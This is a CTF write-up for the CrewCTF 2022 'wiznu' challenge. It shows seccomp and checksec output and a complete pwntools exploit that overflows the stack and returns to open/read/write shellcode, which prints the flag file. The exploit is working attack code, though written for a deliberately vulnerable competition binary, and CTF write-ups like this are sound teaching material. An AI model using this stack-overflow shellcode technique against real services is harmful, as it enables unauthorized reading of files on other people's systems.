## Question 

beginner friendly
Author : st4rn#0086
nc wiznu.crewctf-2022.crewc.tf 1337

[chall](chall)

## Solution

The binary has seccomp enabled that only allows read, write, open syscalls

```
└─# seccomp-tools dump ./chall 
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009
 0005: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0008
 0006: 0x15 0x01 0x00 0x00000001  if (A == write) goto 0008
 0007: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0009
 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0009: 0x06 0x00 0x00 0x00000000  return KILL
 ```

Other than that, it lacks most protections (namely ASLR and NX). 

```
└─# pwn checksec ./chall 
[*] '/root/workspace/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

Combined with the fact that the binary leaks the address of the stack, we should be good to return to shellcode we placed on the stack.

```
pwndbg> r
Starting program: /root/workspace/chall 
Special Gift for Special Person : 0x7fffffffe2d0
```

We'll just return to shellcode and use only the open, read, and write syscalls to cat the flag on the server.

```python
from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('wiznu.crewctf-2022.crewc.tf',1337)
    else:
        return process(e.path)

p = start()

def ret_leak():
    p.recvuntil(b"Special Gift for Special Person : ")
    leak = int(p.recvline(),16)
    return leak

def build_shellcode():
    FLAG_LEN = 40
    shellcode = asm(shellcraft.open(file='flag', oflag=0, mode=0))
    shellcode += asm(shellcraft.amd64.linux.read(fd='rax', buffer='rsp', count=FLAG_LEN))
    shellcode += asm(shellcraft.amd64.linux.write(constants.STDOUT_FILENO, 'rsp', FLAG_LEN))
    shellcode += asm(shellcraft.nop())*220    
    return shellcode

buf = build_shellcode()
buf += p64(ret_leak())

p.sendline(buf)
p.interactive()
````

Running gives us the flag 

```
$ python3 pwn-wiznu.py BIN=./chall REMOTE
[*] '/root/workspace/crew-ctf/wiznu/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
[*] Loading gadgets for '/root/workspace/crew-ctf/wiznu/chall'
[+] Opening connection to wiznu.crewctf-2022.crewc.tf on port 1337: Done
[*] Switching to interactive mode
> crew{ORW_come_to_the_rescue_st4rn_h3r3!}[*] Got EOF while reading in interactive
```